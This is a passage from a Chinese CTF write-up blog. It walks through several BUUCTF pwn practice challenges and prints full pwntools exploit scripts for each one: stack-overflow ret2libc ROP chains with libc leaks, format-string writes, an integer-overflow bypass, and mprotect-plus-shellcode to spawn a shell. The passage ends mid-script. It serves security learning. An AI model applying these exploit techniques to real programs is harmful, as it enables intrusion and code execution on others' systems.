class="string">'ciscn_2019_n_1'</span>)<span class="comment">#p = remote('node3.buuoj.cn',27338)</span></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x30</span><span class="number">-0xc</span>) + p64(<span class="number">0x401348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>发送payload，得到flag</p><p><img src="https://i.loli.net/2020/09/08/bQk98h4CdTyFAa5.png" alt="image.png"></p><h1 id="0x006-ciscn-2019-c-1-ret2csu-ret2libc"><a href="#0x006-ciscn-2019-c-1-ret2csu-ret2libc" class="headerlink" title="0x006.ciscn_2019_c_1 - ret2csu + ret2libc"></a>0x006.ciscn_2019_c_1 - ret2csu + ret2libc</h1><p>惯例的<code>checksec</code>，发现只开了NX保护</p><p><img src="https://i.loli.net/2020/09/08/pAfovxLnPF3Cicu.png" alt="image.png"></p><p>拖入IDA进行分析</p><p>在<code>encrypt()</code>函数中我们发现使用了gets进行读入，存在溢出点，但是我们可以观察到这个函数会对我们的输入进行处理，常规的payload会被经过程序奇怪的处理，破坏掉我们的数据<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p><p>不过我们可以发现该函数是使用的<code>strlen()</code>函数来判断输入的长度，遇到<code>&#39;\x00&#39;</code>时会终止，而<code>gets()</code>函数遇到<code>&#39;\x00&#39;</code>并不会截断，因此我们可以将payload开头的padding的第一个字符置为<code>&#39;\x00&#39;</code>，这样我们所输入的payload就不会被程序改变</p><p>接下来考虑构造rop链getshell，基本上已经是固定套路了，<strong>首先用<code>puts()</code>函数泄漏出<code>puts()</code>的真实地址，同时由于题目没有给出libc文件，故接下来我们考虑用<code>LibcSearcher</code>获取libc，然后libc的基址、<code>/bin/sh</code>和<code>system()</code>的地址就都出来了，配合上csu中的gadget即可getshell</strong></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line">enc_addr = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span> + <span class="string">b'A'</span>*(offset<span class="number">-1</span>) + p64(<span class="number">0xdeafbeef</span>) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(pop_rdi) + p64(e.got[<span class="string">'puts'</span>]) + p64(e.plt[<span class="string">'puts'</span>]) + p64(enc_addr)</span><br><span class="line"><span class="comment">#p = process("./ciscn_2019_c_1")</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27832</span>)</span><br><span class="line">p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'Ciphertext\n\n'</span>)</span><br><span class="line">s = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(s.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">payload2 = <span class="string">'\x00'</span> + <span class="string">b'A'</span>*(offset<span class="number">-1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行我们的exp，成功getshell</p><p><img src="https://i.loli.net/2020/09/10/CL1T3UiExsyJbVP.png" alt="image.png"></p><blockquote><p>发生了很多很玄学的问题（👈其实就是李粗心大意罢le），导致这道题虽然早就有了思路，但是用的时间比预期要长的多</p><p>以及LibcSearcher在本地无法getshell，换成本地的libc就好了（玄学问题变多了（<del>其实只是LibcSearcher库不全⑧</del>））</p><p>以及Ubuntu 18下偶尔会发生栈无法对齐的情况，多retn几次就好了（确信）</p></blockquote><h1 id="0x007-OGeek2019-babyrop-ret2libc"><a href="#0x007-OGeek2019-babyrop-ret2libc" class="headerlink" title="0x007.[OGeek2019]babyrop - ret2libc"></a>0x007.[OGeek2019]babyrop - ret2libc</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/12/nqPDwE5WHeQsmzT.png" alt="image.png"></p><p>拖入IDA进行分析：</p><p><img src="https://i.loli.net/2020/09/12/51JOmdMVjsgAkWN.png" alt="image.png"></p><p>main函数首先会获取一个随机数，传入<code>sub_804871F()</code>中</p><p><img src="https://i.loli.net/2020/09/12/Ijk8GHiOgxXWVdn.png" alt="image.png"></p><p>该函数会将随机数作为字符串输出到s，之后读取最大0x20个字节的输入到v6，用<code>strlen()</code>计算v6长度存到v1并与s比对v1个字节，若不相同则直接退出程序</p><p>考虑到<code>strlen()</code>函数以<code>&#39;\x00&#39;</code>字符作为结束标识符，故我们只需要在输入前放上一个<code>&#39;\x00&#39;</code>即可避开这个检测</p><p>之后会将v5的数值返回到主函数并作为参数又给到<code>sub_80487D0()</code>函数，简单看一下我们便可以发现该函数读取最大v5个字节的输入到<code>buf</code>中，而<code>buf</code>距离<code>ebp</code>只有0xe7个字节</p><p><img src="https://i.loli.net/2020/09/13/1Y7qukt6NVJlDzd.png" alt="image.png"></p><p>由于没有可以直接getshell的函数，故考虑在第一次输入时将v5覆写为<code>0xff</code>以保证能够读取的输入长度最大，在第二次输入时构造rop链使用write函数泄露write的地址，再使用libcsearcher得到libc基址与<code>system()</code>和<code>&quot;/bin/sh&quot;</code>字符串的地址，最后构造rop链调用<code>system(&quot;/bin/sh&quot;)</code>即可getshell</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">write_plt = e.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">payload1 = <span class="string">b'\x00'</span> + <span class="number">7</span>* <span class="string">b'\xff'</span></span><br><span class="line">payload2 = <span class="string">b'A'</span> * <span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(<span class="number">0x80487d0</span>) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)<span class="comment">#p = remote('node3.buuoj.cn',25330)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b'Correct\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b'A'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即可getshell</p><p><img src="https://i.loli.net/2020/09/13/SOvMLpHGFVaQfZb.png" alt="image.png"></p><h1 id="0x008-jarvisoj-level0-ret2text"><a href="#0x008-jarvisoj-level0-ret2text" class="headerlink" title="0x008.jarvisoj_level0 - ret2text"></a>0x008.jarvisoj_level0 - ret2text</h1><blockquote><p>好多重复考点的简单题啊…</p></blockquote><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/18/utzZo2RkpGUC7Yj.png" alt="image.png"></p><p>拖入IDA进行分析，可以发现存在一个可以溢出的函数<code>vulnerable_function()</code>，只需要<code>0x80</code>个字节即可溢出</p><p><img src="https://i.loli.net/2020/09/18/kFVOigZbem3U1yr.png" alt="image.png"></p><p>同时存在一个可以直接getshell的函数<code>callsystem()</code></p><p>直接构造payload覆写返回地址到<code>callsystem()</code>函数即可getshell</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'level0'</span>)<span class="comment">#p = remote('node3.buuoj.cn',29367)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/ykhU4DgzILKvQXG.png" alt="image.png"></p><h1 id="0x009-ciscn-2019-en-2-ret2csu-ret2libc"><a href="#0x009-ciscn-2019-en-2-ret2csu-ret2libc" class="headerlink" title="0x009.ciscn_2019_en_2 - ret2csu + ret2libc"></a>0x009.ciscn_2019_en_2 - ret2csu + ret2libc</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/18/Fv6MeQnd4fU8Rmr.png" alt="image.png"></p><p>拖入IDA进行分析<del>感觉这题好像在哪个地方做过的样子</del>（<del>ciscn_2019_c_1</del>）</p><p>在<code>encrypt()</code>函数中我们发现使用了gets进行读入，存在溢出点，但是我们可以观察到这个函数会对我们的输入进行处理，常规的payload会被经过程序奇怪的处理，破坏掉我们的数据<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p><p>不过我们可以发现该函数是使用的<code>strlen()</code>函数来判断输入的长度，遇到<code>&#39;\x00&#39;</code>时会终止，而<code>gets()</code>函数遇到<code>&#39;\x00&#39;</code>并不会截断，因此我们可以将payload开头的padding的第一个字符置为<code>&#39;\x00&#39;</code>，这样我们所输入的payload就不会被程序改变</p><p>接下来考虑构造rop链getshell，基本上已经是固定套路了，<strong>首先用<code>puts()</code>函数泄漏出<code>puts()</code>的真实地址，同时由于题目没有给出libc文件，故接下来我们考虑用<code>LibcSearcher</code>获取libc，然后libc的基址、<code>/bin/sh</code>和<code>system()</code>的地址就都出来了，配合上csu中的gadget即可getshell</strong></p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25348</span>)<span class="comment">#process('./ciscn_2019_en_2')</span></span><br><span class="line">e = ELF(<span class="string">'./ciscn_2019_en_2'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'\x00'</span> + <span class="string">b'A'</span>*(offset<span class="number">-1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'text\n\n'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'\x00'</span> + <span class="string">b'A'</span>*(offset<span class="number">-1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) +p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/7AoReBMP9Lr3Ojb.png" alt="image.png"></p><blockquote><p>需要注意的是Ubuntu 18有的时候会存在栈无法对齐的情况，可以多使用几次<code>retn</code>的gadget来对其栈</p></blockquote><h1 id="0x00A-第五空间2019-决赛-PWN5-fmtstr"><a href="#0x00A-第五空间2019-决赛-PWN5-fmtstr" class="headerlink" title="0x00A.[第五空间2019 决赛]PWN5 - fmtstr"></a>0x00A.[第五空间2019 决赛]PWN5 - fmtstr</h1><p>惯例的<code>checksec</code>，发现开了NX保护和canary</p><p><img src="https://i.loli.net/2020/09/18/UyvYwOl6x1RH4hE.png" alt="image.png"></p><p>拖入IDA进行分析：</p><p><img src="https://i.loli.net/2020/09/18/ZweqQ3kByjGUmVK.png" alt="image.png"></p><p>该程序获取一个随机数，读入到<code>0x804c044</code>上，随后两次读入用户输入并判断第二次输入与随机数是否相同，相同则可以获得shell</p><p>我们可以发现存在<strong>格式化字符串漏洞</strong>，可以进行<strong>任意地址读与任意地址写</strong>，故考虑将<code>0x804c044</code>地址上的随机数覆写为我们想要的值，随后直接输入我们覆写的值即可getshell</p><p>同时我们简单的跑一下这个程序就可以知道格式字符串是位于栈上的第10个参数（”aaaa” == 0x61616161）</p><p><img src="https://i.loli.net/2020/09/18/Qiglex7ZCfsFhub.png" alt="image.png"></p><p>我们可以使用pwntools中的<code>fmtstr_payload()</code>来比较方便地构造能够进行任意地址写的payload</p><blockquote><p>具体用法可以百度，这里就不再摘抄一遍了</p></blockquote><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804c044</span>:<span class="number">0x1</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)<span class="comment">#p = remote('node3.buuoj.cn',25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(str(<span class="number">0x1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/81KUdhp5EWb2JgP.png" alt="image.png"></p><h1 id="0x00B-BJDCTF-2nd-r2t3-integer-overflow-ret2text"><a href="#0x00B-BJDCTF-2nd-r2t3-integer-overflow-ret2text" class="headerlink" title="0x00B.[BJDCTF 2nd]r2t3 - integer overflow + ret2text"></a>0x00B.[BJDCTF 2nd]r2t3 - integer overflow + ret2text</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/18/KoFCaQM71JZzNgA.png" alt="image.png"></p><p>拖入IDA进行分析</p><p>主函数中读入最大0x400个字节，但是开辟了0x408字节的空间，无法溢出</p><p><img src="https://i.loli.net/2020/10/07/usMxPdgyVGUtAEB.png" alt="image.png"></p><p>同时主函数会将输入传入<code>name_check()</code>函数中，若通过<code>strlen()</code>计算出来的长度在4~8个字节之间则会将我们的输入通过<code>strcpy()</code>拷贝至<code>dest</code>上，而这里到ebp之间只有<code>0x11</code>个字节的空间，我们完全可以通过这段代码覆盖掉该函数的返回地址</p><p><img src="https://i.loli.net/2020/09/18/GlzDVrQKSOiykoN.png" alt="image.png"></p><p>同时我们可以观察到存在可以直接getshell的后门函数</p><p><img src="https://i.loli.net/2020/09/18/QNlFfbPJyCDL9I5.png" alt="image.png"></p><p>考虑到在<code>name_check()</code>函数中用来存放输入长度的变量为8位无符号整型，范围为0~255，故我们只需要输入260个字节便可以发生上溢降使该变量的值上溢为4，绕过判定</p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x11</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804858b</span>) + <span class="string">b'A'</span> * (<span class="number">260</span> - <span class="number">4</span> - <span class="number">4</span> - <span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./r2t3'</span>)<span class="comment">#p = remote('node3.buuoj.cn',25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>发送payload即可getshell</p><p><img src="https://i.loli.net/2020/09/18/XmBDE6Lk8UHlN1R.png" alt="image.png"></p><h1 id="0x00C-get-started-3dsctf-2016-ret2text-ret2shellcode"><a href="#0x00C-get-started-3dsctf-2016-ret2text-ret2shellcode" class="headerlink" title="0x00C.get_started_3dsctf_2016 - ret2text || ret2shellcode"></a>0x00C.get_started_3dsctf_2016 - ret2text || ret2shellcode</h1><blockquote><p>注：这是一道屑题</p></blockquote><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/18/XZEnHkaoDL6puN4.png" alt="image.png"></p><p>拖入IDA进行分析，可以发现存在一个赤裸裸的<code>gets()</code>溢出</p><p><img src="https://i.loli.net/2020/09/18/KHx7Dz9kULZpIRd.png" alt="image.png"></p><p>同时存在一个<code>get_flag()</code>函数可以获取flag，不过要求参数1为<code>0x308cd64f</code>，参数2为<code>0x195719d1</code></p><p><img src="https://i.loli.net/2020/09/18/H7PwgMDErGxZcRi.png" alt="image.png"></p><h2 id="解法1：ret2text"><a href="#解法1：ret2text" class="headerlink" title="解法1：ret2text"></a>解法1：ret2text</h2><p>32位程序通过栈传参，故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x38</span> + p32(<span class="number">0x80489A0</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>不过很明显，出题人的环境很明显有丶小问题🔨🔨🔨，远程跑不通这个payload</p><p><img src="https://i.loli.net/2020/10/07/6ZxFokbJUwI2YVS.png" alt="image.png"></p><p>问题出在哪呢？该程序尝试打开的是<code>flag.txt</code>文件，但是平台所自动生成的是<code>flag</code>文件，故此种方法<strong>无法获得flag</strong></p><p>我们尝试寻找第二种解法</p><h2 id="解法2：ret2shellcode"><a href="#解法2：ret2shellcode" class="headerlink" title="解法2：ret2shellcode"></a>解法2：ret2shellcode</h2><p>首先我们发现在程序中编入了大量的函数，其中就包括<code>mprotect()</code>，可以修改指定内存地址的权限</p><p><img src="https://i.loli.net/2020/09/19/JX5nSQwg9dFTufU.png" alt="image.png"></p><p>故考虑使用<code>mprotect()</code>修改内存段权限为可读可写可运行后在上面写入shellcode并跳转至内存段执行shellcode以getshell</p><p>在<strong>pwndbg</strong>中使用<code>vmmap</code>查看可以用的内存段，前面三个段随便选一个就行</p><p><img src="https://i.loli.net/2020/09/20/1nXPY9VqgLaQtmR.png" alt="image.png"></p><p>需要注意的是我们需要手动将<code>mprotect()</code>的参数弹出（日常踩坑）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./get_started_3dsctf_2016'</span>)<span class="comment">#p = remote('node3.buuoj.cn',29719)#</span></span><br><span class="line">e = ELF(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x804951c</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">'read'</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ec000</span></span><br><span class="line">offset = <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即可getshell</p><p><img src="https://i.loli.net/2020/09/20/dk9jnLSZRt1qwXO.png" alt="image.png"></p><h1 id="0x00D-ciscn-2019-n-8-overwrite"><a href="#0x00D-ciscn-2019-n-8-overwrite" class="headerlink" title="0x00D.ciscn_2019_n_8 - overwrite"></a>0x00D.ciscn_2019_n_8 - overwrite</h1><p>惯例的<code>checksec</code>，发现开了<strong>栈不可执行、地址随机化、Canary</strong>三大保护（<del>噔  噔  咚</del></p><p><img src="https://i.loli.net/2020/09/20/OqJDm4QUE367nWM.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/09/20/2dOMiusme5lUfhc.png" alt="image.png"></p><p>使用scanf读入字符串到变量<code>var</code>，存在漏洞，同时程序会将var的地址转换为一个(_QWORD)类型指针（长度为四字节），并判断<code>var[13]</code>是否为<code>0x11</code>，若是则返回一个shell</p><p>故考虑直接输入将<code>var[13]</code>覆写为<code>0x11</code>即可getshell</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">13</span>*<span class="number">4</span> + p32(<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_n_8'</span>) <span class="comment"># p = remote('node3.buuoj.cn',29901)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/20/4RHWBEUrOSaPhXw.png" alt="image.png"></p><h1 id="0x00E-not-the-same-3dsctf-2016-ret2shellcode"><a href="#0x00E-not-the-same-3dsctf-2016-ret2shellcode" class="headerlink" title="0x00E.not_the_same_3dsctf_2016 - ret2shellcode"></a>0x00E.not_the_same_3dsctf_2016 - ret2shellcode</h1><blockquote><p>not the same（指 the same（</p></blockquote><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/09/20/lxh7UmuzOJIRvbW.png" alt="image.png"></p><p>拖进IDA里康康</p><p><img src="https://i.loli.net/2020/09/20/FGmtAInhU9Dcx1a.png" alt="image.png"></p><p>主函数中直接存在可以被利用的<code>gets()</code>函数，同时还给了我们一个提示信息——<strong>bora ver se tu ah o bichao memo</strong>，大致可以翻译为：<strong>Did you see the wrong note?</strong><del>看起来似乎没什么用的样子</del></p><p>尝试先使用与前一题相同的思路来解</p><p>首先用<code>pwndbg</code>的<code>vmmap</code>查看可以用的内存</p><p><img src="https://i.loli.net/2020/09/20/3MkHWsKtXChuezG.png" alt="image.png"></p><p>同时IDA中我们发现程序中依然存在<code>mprotect()</code>函数可以改写权限</p><p><img src="https://i.loli.net/2020/09/20/4IebV5KgXMrA9Go.png" alt="image.png"></p><p>和前一题所不同的是gadget的位置有丶小变化（<del>原来只有这个不同🐎</del>）</p><p><img src="https://i.loli.net/2020/09/20/b8JLWav12ru9SFE.png" alt="image.png"></p><p>故我们可以使用<strong>与前一题几乎完全相同的exp</strong>来getshell，只需要把csu里的gadget的地址稍微修改一下即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./not_the_same_3dsctf_2016'</span>)<span class="comment">#p = remote('node3.buuoj.cn',28147)#</span></span><br><span class="line">e = ELF(<span class="string">'./not_the_same_3dsctf_2016'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x80494dc</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">'read'</span>]</span><br><span class="line">sc_addr = <span 